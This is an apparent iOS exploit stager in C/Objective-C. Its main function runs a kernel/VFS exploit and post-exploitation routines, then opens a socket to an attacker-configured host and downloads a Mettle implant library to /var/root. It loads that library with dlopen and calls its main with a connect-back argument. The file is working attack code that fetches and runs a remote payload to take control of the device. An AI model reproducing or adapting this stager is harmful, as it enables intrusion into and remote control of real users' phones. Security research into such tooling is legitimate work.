#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <mach-o/fat.h>
#include <mach-o/loader.h>
#include <sys/mman.h>
#include <mach/vm_map.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/attr.h>

#include <Foundation/NSObjCRuntime.h>

#include <sys/types.h>
#include <netinet/in.h>

#include "common.h"
#include "sploit.h"
#include "post.h"

int main() {
    NSLog(@"XXX Starting exploit\n");
    vfs_sploit();
    NSLog(@"XXX Starting post exploitation\n");
    post();
    NSLog(@"XXX Downloading payload\n");

    const char config_placeholder[1024] = "PAYLOAD_URL";
    const char *payload_file = "/var/root/mettle.dylib";

    // Load the payload from server
    int sockfd = 0;
    struct sockaddr_in serv_addr;
    const char *getpayload = "GET /payload HTTP/1.1\r\n\r\n";
    const int chunk_size = 4096;
    char* payload_buffer = malloc(chunk_size);
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
      NSLog(@"XXX Could not connect socket\n");
      return 1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = *(uint32_t*)config_placeholder;
    serv_addr.sin_port = *(uint16_t*)(config_placeholder + 4);

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
      NSLog(@"XXX Could not connect\n");
      return 1;
    }
    send(sockfd, getpayload, strlen(getpayload), 0);

    unlink(payload_file);
    int payloadfd = open(payload_file, O_WRONLY | O_CREAT, 0700);
    int read_header = 0;
    int n;
    while ((n = read(sockfd, payload_buffer, chunk_size)) > 0) {
      if (!read_header) {
        char * payload_start = (char*)memmem((unsigned char*)payload_buffer, chunk_size, (unsigned char*)"\xce\xfa\xed\xfe", 4);
        write(payloadfd, payload_start, n - (payload_start - payload_buffer));
        read_header = 1;
        NSLog(@"XXX Read header\n");
      } else {
        write(payloadfd, payload_buffer, n);
        NSLog(@"XXX Read\n");
      }
    }

    close(payloadfd);
    close(sockfd);
    free(payload_buffer);

    // Test writing to file
    //{
        //FILE *f = fopen("/private/var/root/test.txt", "w");
        //if (f == 0) {
            //NSLog(@"failed to write test file");
        //} else {
            //NSLog(@"wrote test file: %p\n", f);
        //}
        
        //unlink("/private/var/root/test.txt");
    //}
    
    //NSLog(@"XXX Downloading payload\n");
    //NSURL *url = [NSURL URLWithString:[NSString stringWithUTF8String:config_placeholder]];
    //NSData *urlData = [NSData dataWithContentsOfURL:url];
    //if (urlData) {
      //NSLog(@"XXX Writing payload\n");
      //[urlData writeToFile:[NSString stringWithUTF8String:config_placeholder] atomically:YES];
      //NSLog(@"XXX Wrote payload\n");
    //} else {
      //NSLog(@"XXX Could not connect\n");
    //}

    // Launch the payload
    void* libmettle = dlopen(payload_file, RTLD_NOW);
    NSLog(@"mettle found %p\n", (void*)(libmettle));

    //void* libsys = dlopen("libSystem.dylib", RTLD_NOW);
    //NSLog(@"sys found %p\n", (void*)(libsys));
    //libsys = dlopen("libSystem.B.dylib", RTLD_NOW);
    //NSLog(@"sys found %p\n", (void*)(libsys));
    //if (!libmettle) return 1;

    typedef int (*main_ptr)(int argc, const char *argv[]);
    main_ptr main_func = dlsym(libmettle, "main");
    const char * progname = "mettle";
    const char * arg1 = "-u";
    const char * arg2 = config_placeholder+6;
    const char *argv[] = { progname, arg1, arg2, NULL };
    NSLog(@"main %p\n", main_func);
    int mainret = main_func(3, argv);
    NSLog(@"main finished %d\n", mainret);
}

uint64_t entry[] = { MAGIC, (uint64_t)&main };
